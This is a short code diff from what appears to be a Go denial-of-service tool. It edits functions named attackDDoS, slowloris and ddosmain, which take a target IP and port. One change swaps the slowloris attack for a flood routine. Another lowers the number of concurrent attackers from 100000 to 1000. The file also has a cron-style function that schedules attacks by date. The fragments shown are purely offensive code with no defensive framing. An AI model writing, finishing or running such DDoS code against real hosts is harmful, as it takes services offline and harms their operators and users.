@@ -81,8 +81,8 @@ func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 
 func attackDDoS(ip string, port string) {
 	test()
-//	ddosmain(ip + ":" + port)
-	slowloris(ip + ":" + port)
+	ddosmain(ip + ":" + port)
+//	slowloris(ip + ":" + port)
 	test()
 }
 
@@ -116,7 +116,7 @@ func slowloris(url string) {
 }
 
 func ddosmain(url string) {
-	attackers := 100000
+	attackers := 1000
 	x := randomNumber(15)
 	fmt.Print("Waiting: ", x)
 	time.Sleep(time.Duration(x) * time.Second)
